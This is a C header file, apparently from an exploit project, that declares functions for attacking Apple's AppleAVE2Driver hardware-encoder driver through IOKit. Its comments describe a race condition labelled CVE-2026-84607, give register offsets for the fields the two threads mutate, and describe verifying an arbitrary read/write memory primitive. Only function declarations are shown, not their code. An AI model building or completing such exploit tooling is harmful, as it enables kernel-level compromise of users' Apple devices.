#ifndef APPLEAVE2_CORE_H
#define APPLEAVE2_CORE_H

#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <pthread.h>
#include "appleave2_result.h"

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Opens connection to AppleAVE2Driver via IOKit.
 */
io_connect_t ave_driver_open(void);

/**
 * Prepares and allocates hardware encoder session buffers.
 */
int ave_session_setup(io_connect_t conn, uint32_t enc_type, uint32_t width, uint32_t height);

/**
 * Executes concurrent multithreaded race condition (CVE-2026-84607).
 * Thread 1: Mutates sEnc.eType at [x19, #0x270]
 * Thread 2: Rapidly executes frame encodes with eEncType at [x22, #0x58]
 */
int ave_race_state_engine(io_connect_t conn, uint32_t iterations, appleave2_result_t *out_result);

/**
 * Memory probe and verification of arbitrary read/write primitive.
 */
int ave_verify_read_primitive(appleave2_result_t *result);

#ifdef __cplusplus
}
#endif

#endif /* APPLEAVE2_CORE_H */
